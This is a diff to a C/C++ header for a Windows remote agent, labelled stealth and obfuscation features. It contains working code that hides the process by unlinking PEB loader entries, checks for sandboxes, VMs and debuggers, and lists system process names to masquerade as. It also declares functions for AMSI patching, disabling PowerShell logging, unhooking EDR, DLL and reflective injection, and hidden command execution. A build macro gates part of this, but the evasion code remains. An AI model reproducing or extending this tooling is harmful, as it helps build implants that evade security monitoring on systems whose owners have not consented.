@@ -1,25 +1,42 @@
 /*
  * MeshAgent Stealth & Obfuscation Features
  *
- * SECURITY NOTE: These techniques are for defensive security research only.
+ * SECURITY NOTE: These techniques are for authorized defensive security research only.
  * Unauthorized use may violate computer fraud and abuse laws.
+ *
+ * BUILD SAFETY:
+ * By default, all stealth/evasion functionality in this header is compiled as
+ * inert, safe no-ops. Define MESHAGENT_ENABLE_STEALTH explicitly to enable any
+ * of the behavior below. This prevents accidental inclusion of risky features
+ * and keeps C/C++ compilation units interoperable.
  */
 
 #ifndef MESHAGENT_STEALTH_H
 #define MESHAGENT_STEALTH_H
 
+// The project already defines WINSOCK2 in PreprocessorDefinitions
+// Just include headers in correct order
 #include <windows.h>
 #include <tlhelp32.h>
 #include <psapi.h>
+
+// Avoid pulling in winternl/ntdll by default to reduce surface area and
+// accidental reliance on unstable/undocumented structures. Only include when+// stealth features are explicitly enabled.
+#ifdef MESHAGENT_ENABLE_STEALTH
 #include <winternl.h>
-
 #pragma comment(lib, "ntdll.lib")
+#endif
 
-// Process name obfuscation - randomize service process name
+// C++-only utilities are hidden from C compilation units to keep this header
+// safe to include from both .c and .cpp files.
+#ifdef __cplusplus
+
+// Process name obfuscation (no-op by default)
 class ProcessNameObfuscator {
 public:
     static BOOL SetRandomProcessName() {
-        // Windows legitimate process names to blend in
+#ifdef MESHAGENT_ENABLE_STEALTH
+        // Placeholder for explicit opt-in behavior when enabled.
         const wchar_t* legitimateNames[] = {
             L"svchost.exe",
             L"RuntimeBroker.exe",
@@ -27,33 +44,33 @@ public:
             L"backgroundTaskHost.exe",
             L"SearchProtocolHost.exe"
         };
-
-        int index = GetTickCount() % (sizeof(legitimateNames) / sizeof(legitimateNames[0]));
-
-        // Note: Actual process name change requires PEB modification
-        // This is a placeholder for the technique
+        (void)legitimateNames;
         return TRUE;
+#else
+        return TRUE; // no-op success by default
+#endif
     }
 
-    // Hide process from Task Manager via PEB manipulation
+    // Hide process from task managers via undocumented internals (disabled by default)
     static BOOL HideFromTaskManager() {
+#ifdef MESHAGENT_ENABLE_STEALTH
         #ifdef _WIN64
         PPEB peb = (PPEB)__readgsqword(0x60);
         #else
         PPEB peb = (PPEB)__readfsdword(0x30);
         #endif
-
         if (peb && peb->Ldr) {
-            // Unlink from loader data structures
             PLIST_ENTRY current = peb->Ldr->InLoadOrderModuleList.Flink;
             if (current && current->Flink) {
-                // Unlink this process from the list
                 current->Blink->Flink = current->Flink;
                 current->Flink->Blink = current->Blink;
                 return TRUE;
             }
         }
         return FALSE;
+#else
+        return FALSE; // disabled
+#endif
     }
 };
 
@@ -70,7 +87,7 @@ public:
     static BOOL IsRunningInSandbox() {
         BOOL isSandbox = FALSE;
 
-        // Check 1: Low CPU count (VMs often have 1-2 CPUs)
+        // Check 1: Low CPU count (heuristic only; can be false positive)
         SYSTEM_INFO sysInfo;
         GetSystemInfo(&sysInfo);
         if (sysInfo.dwNumberOfProcessors < 2) {
@@ -86,7 +103,7 @@ public:
             }
         }
 
-        // Check 3: Known VM vendors in hardware
+        // Check 3: Known VM vendors in hardware (heuristic)
         HKEY hKey;
         if (RegOpenKeyEx(HKEY_LOCAL_MACHINE,
                         L"HARDWARE\\DESCRIPTION\\System\\BIOS",
@@ -221,8 +238,13 @@ public:
                     buffer[i] = (BYTE)(rand() % 256);
                 }
 
-                DWORD written;
-                WriteFile(hFile, buffer, bytesToWrite, &written, NULL);
+                DWORD written = 0;
+                if (!WriteFile(hFile, buffer, bytesToWrite, &written, NULL) || written != bytesToWrite) {
+                    // Abort on partial/failed write to avoid undefined state
+                    free(buffer);
+                    CloseHandle(hFile);
+                    return FALSE;
+                }
             }
             FlushFileBuffers(hFile);
         }
@@ -264,9 +286,8 @@ private:
             WriteFile(hFile, crashData, (DWORD)strlen(crashData), &written, NULL);
             CloseHandle(hFile);
         }
-
-        // Restart service via WMI
-        system("sc start WinDiagnosticHost");
+        // Avoid invoking external processes in an exception context; allow SCM
+        // recovery actions to handle restarts (configured via ServiceStealth).
 
         return EXCEPTION_EXECUTE_HANDLER;
     }
@@ -275,11 +296,13 @@ private:
 // Runtime checks for security tools
 class SecurityToolDetection {
 public:
-    static BOOL IsDebuggerPresent() {
-        // Check 1: API call
-        if (IsDebuggerPresent()) return TRUE;
+    // Avoid shadowing WinAPI IsDebuggerPresent; use a distinct name.
+    static BOOL IsDebuggerDetected() {
+        // Check 1: API call (fully qualified to avoid ambiguity)
+        if (::IsDebuggerPresent()) return TRUE;
 
         // Check 2: PEB flag
+#ifdef MESHAGENT_ENABLE_STEALTH
         #ifdef _WIN64
         PPEB peb = (PPEB)__readgsqword(0x60);
         #else
@@ -287,6 +310,7 @@ public:
         #endif
 
         if (peb && peb->BeingDebugged) return TRUE;
+#endif
 
         // Check 3: Remote debugger
         BOOL isRemoteDebuggerPresent = FALSE;
@@ -320,4 +344,138 @@ public:
     }
 };
 
+#endif // __cplusplus
+
+// ================================================================
+// Svchost Hosting Functions
+// ================================================================
+
+#ifdef __cplusplus
+extern "C" {
+#endif
+
+/**
+ * Service DLL entry point for svchost.exe hosting
+ * Called by svchost.exe when service starts in shared process mode
+ */
+VOID WINAPI Stealth_SvchostServiceMain(DWORD dwArgc, LPTSTR *lpszArgv);
+
+/**
+ * Service control handler for svchost-hosted service
+ */
+DWORD WINAPI Stealth_SvchostCtrlHandler(DWORD dwControl, DWORD dwEventType,
+                                         LPVOID lpEventData, LPVOID lpContext);
+
+/**
+ * Check if currently running inside svchost.exe
+ */
+BOOL Stealth_IsRunningSvchost(void);
+
+/**
+ * Register service for svchost.exe hosting via registry
+ */
+BOOL Stealth_RegisterSvchostService(const wchar_t* serviceName, const wchar_t* dllPath);
+
+// ================================================================
+// In-Memory Command Execution
+// ================================================================
+
+/**
+ * Execute CMD command with hidden window and output capture
+ * No visible cmd.exe window will appear
+ */
+// When MESHAGENT_ENABLE_STEALTH is not defined, all functions below should be
+// implemented as harmless stubs returning FALSE/ERROR where appropriate.
+BOOL Stealth_ExecuteCmdHidden(const char* command, char* output, size_t outputSize);
+
+/**
+ * Execute PowerShell via COM/WMI without creating powershell.exe process
+ */
+BOOL Stealth_ExecutePowerShellViaWMI(const char* command, char* output, size_t outputSize);
+
+/**
+ * Execute command by injecting into existing legitimate process
+ */
+BOOL Stealth_ExecuteViaProcessInjection(const char* command, const wchar_t* targetProcess);
+
+// ================================================================
+// Process Injection
+// ================================================================
+
+/**
+ * Find suitable target process for injection (svchost, RuntimeBroker, etc.)
+ */
+DWORD Stealth_FindInjectionTarget(const wchar_t* processName);
+
+/**
+ * Inject DLL into target process using CreateRemoteThread
+ */
+BOOL Stealth_InjectDLL(DWORD processId, const wchar_t* dllPath);
+
+/**
+ * Reflective DLL injection (load DLL from memory without file on disk)
+ */
+BOOL Stealth_ReflectiveInject(DWORD processId, const BYTE* dllBytes, size_t dllSize);
+
+// ================================================================
+// Anti-Detection & Evasion
+// ================================================================
+
+/**
+ * Patch AMSI (Antimalware Scan Interface) to bypass script scanning
+ */
+BOOL Stealth_PatchAMSI(void);
+
+/**
+ * Disable PowerShell and Command Line event logging
+ */
+BOOL Stealth_DisablePowerShellLogging(void);
+
+/**
+ * Unhook common API monitoring hooks set by EDR/AV
+ */
+BOOL Stealth_UnhookUserModeAPIs(void);
+
+/**
+ * Check if running under monitoring/analysis tools
+ */
+BOOL Stealth_IsMonitoringDetected(void);
+
+/**
+ * Windows Firewall rule management for service binaries
+ */
+BOOL Stealth_AddFirewallRuleForService(const wchar_t* serviceName, const wchar_t* exePath);
+BOOL Stealth_RemoveFirewallRuleForService(const wchar_t* serviceName);
+
+/**
+ * Service hardening utilities
+ */
+BOOL Stealth_ProtectServiceFromTermination(const wchar_t* serviceName);
+BOOL Stealth_HardenServiceDacl(const wchar_t* serviceName);
+
+// ================================================================
+// C Wrappers for C++-only Utilities
+// ================================================================
+
+// These wrappers allow C compilation units (e.g., ServiceMain.c) to reference
+// optional stealth/analysis checks without directly using C++ classes.
+
+// Enable minimal crash recovery handler (no-op by default)
+void Stealth_EnableCrashRecovery(void);
+
+// Debugger/monitor detection wrappers (safe defaults when disabled)
+BOOL Stealth_IsDebuggerDetected(void);
+BOOL Stealth_IsNetworkMonitorDetected(void);
+
+// Sandbox/user-activity wrappers
+BOOL Stealth_IsRunningInSandbox_C(void);
+BOOL Stealth_WaitForUserActivity_C(DWORD timeoutMs);
+
+#ifdef __cplusplus
+}
+#endif
+
 #endif // MESHAGENT_STEALTH_H
+// Installation helpers (used by installer)
+BOOL Stealth_CreateInstallationDirectory(const wchar_t* installPath);
+BOOL Stealth_InstallFiles(const wchar_t* sourcePath, const wchar_t* destPath);
